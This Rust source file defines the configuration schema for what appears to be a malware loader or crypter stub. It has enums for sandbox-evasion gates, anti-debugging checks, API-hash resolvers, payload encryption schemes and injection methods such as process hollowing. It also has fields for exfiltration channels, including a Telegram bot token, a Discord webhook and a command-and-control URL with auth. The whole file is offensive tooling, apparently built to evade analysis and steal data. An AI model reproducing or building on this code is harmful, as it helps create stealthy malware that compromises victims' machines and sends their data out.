use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct StubProgram {
    pub seed: [u8; 32],
    pub gates: Vec<Gate>,
    pub debug_check: DebugCheck,
    pub resolver: Resolver,
    pub decrypt: DecryptScheme,
    pub virtualization: bool,
    pub integrity: IntegrityCheck,
    pub execution: ExecutionMethod,
    pub key_material: KeyMaterial,
    pub payload_blob: Vec<u8>,
    pub target_os: TargetOs,
    /// XOR key for encrypting config-string blocklists in the stub
    pub config_xor_key: [u8; 32],
    /// anti-dump: re-protect decrypted payload after use
    pub anti_dump: bool,
    /// anti-emulation: sleep acceleration check
    pub anti_emulation: bool,
    /// junk code injection density (0..1)
    pub junk_density: f32,

    // ---- per-build exfil secrets (path 2) ----
    pub telegram_token: String,
    pub telegram_chat: String,
    pub discord_webhook: String,
    pub c2_url: String,
    pub c2_auth: String,
}

impl Default for StubProgram {
    fn default() -> Self {
        Self {
            seed: [0u8; 32],
            gates: Vec::new(),
            debug_check: DebugCheck::None,
            resolver: Resolver::ExportWalkFnv1a,
            decrypt: DecryptScheme::AesGcm,
            virtualization: false,
            integrity: IntegrityCheck::None,
            execution: ExecutionMethod::ImageMap,
            key_material: KeyMaterial {
                salt: Vec::new(),
                nonce: Vec::new(),
                bind_to_fingerprint: false,
                bind_to_code_hash: false,
            },
            payload_blob: Vec::new(),
            target_os: TargetOs::Windows,
            config_xor_key: [0u8; 32],
            anti_dump: false,
            anti_emulation: false,
            junk_density: 0.0,
            telegram_token: String::new(),
            telegram_chat: String::new(),
            discord_webhook: String::new(),
            c2_url: String::new(),
            c2_auth: String::new(),
        }
    }
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum Gate {
    UptimeMin(u64),
    CursorMotion { samples: u8 },
    RamMinMb(u32),
    CpuCoresMin(u8),
    UsernameBlocklist,
    HostnameBlocklist,
    DomainJoined,
    SleepJitter { min_ms: u32, max_ms: u32 },
    SleepAccelerationCheck { sleep_ms: u64, min_ratio: f32 },
    ApiHammerCheck,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum DebugCheck {
    IsDebuggerPresent,
    PEBBeingDebugged,
    NtGlobalFlag,
    NtQueryInformationProcess,
    TimingCheck { rounds: u8 },
    None,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum Resolver {
    ExportWalkFnv1a,
    ExportWalkCrc32,
    ExportWalkDjb2,
    PebWalk,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum DecryptScheme {
    AesGcm,
    ChaCha20Poly1305,
    AesCbcHmac,
    XorDerived,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum IntegrityCheck {
    TextSectionHash,
    RegionCrc { start: u32, len: u32 },
    None,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum ExecutionMethod {
    ImageMap,
    ShellcodeInvoke,
    ProcessHollow { host: String },
    SpawnInject { host: String },
    DirectJump,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct KeyMaterial {
    pub salt: Vec<u8>,
    pub nonce: Vec<u8>,
    pub bind_to_fingerprint: bool,
    pub bind_to_code_hash: bool,
}

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub enum TargetOs {
    Windows,
    Linux,
    Macos,
}
